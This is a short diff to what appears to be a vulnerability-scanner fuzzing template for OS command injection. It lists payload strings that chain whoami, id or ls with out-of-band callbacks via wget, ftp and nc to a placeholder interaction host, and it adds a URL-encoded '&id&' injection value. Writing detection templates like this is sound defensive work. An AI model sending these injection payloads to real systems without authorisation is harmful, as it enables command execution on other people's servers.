@@ -100,6 +100,7 @@ requests:
         - "whoami > /dev/null; wget http://{{marker}}"
         - "id > /dev/null; ftp -o /dev/null ftp://{{marker}}"
         - "ls > /dev/null; nc -z {{marker}} 80"
+        - "%26id%26"
     fuzzing:
       - part: query
         type: postfix
